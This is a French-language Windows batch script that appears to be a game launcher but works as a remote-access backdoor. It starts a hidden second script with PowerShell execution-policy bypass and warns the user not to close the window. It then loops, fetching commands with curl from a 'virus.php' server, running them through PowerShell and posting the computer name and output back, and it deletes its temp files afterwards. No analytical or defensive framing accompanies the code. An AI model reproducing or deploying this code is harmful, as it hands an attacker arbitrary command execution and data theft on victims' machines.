@echo off
title Ne pas fermer (risque de suppression de fichiers systemes windows x64)

color 0C
start "" powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0game.ps1"
start "" powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/c \"%~dp0codes4.bat"' -WindowStyle Hidden"

:client
@echo off
:: ============================================
:: CLIENT - client.bat (Windows)
:: ============================================
setlocal EnableDelayedExpansion

set "BASE_URL=https://frxchat.alwaysdata.net/virus.php"
set "POLL_INTERVAL=3"

:loop

:: 1. Recuperation commande serveur
set "CMD="

for /f "usebackq delims=" %%C in (`curl -s "%BASE_URL%?get"`) do (
    set "CMD=%%C"
    goto gotcmd
)

:gotcmd

if not defined CMD (
    timeout /t %POLL_INTERVAL% /nobreak >nul
    goto loop
)


:: 2. EXECUTION + CAPTURE COMPLETE (IMPORTANT FIX)
set "OUTFILE=%TEMP%\cmd_out.txt"
set "SEND=%TEMP%\packet.txt"

powershell -NoProfile -ExecutionPolicy Bypass -Command "!CMD!" > "!OUTFILE!" 2>&1

:: 3. Construction packet complet (machine + commande + output)
(
echo %COMPUTERNAME% ^> !CMD!
echo ----------------------------------------
type "!OUTFILE!"
) > "!SEND!"

:: 4. ENVOI AU SERVEUR
curl -s -X POST "%BASE_URL%?result" ^
     --data-binary "@!SEND!" ^
     -H "Content-Type: text/plain" >nul

:: 5. CLEAN
del "!OUTFILE!" >nul 2>&1
del "!SEND!" >nul 2>&1
set "CMD="

timeout /t %POLL_INTERVAL% /nobreak >nul
goto loop
exit \b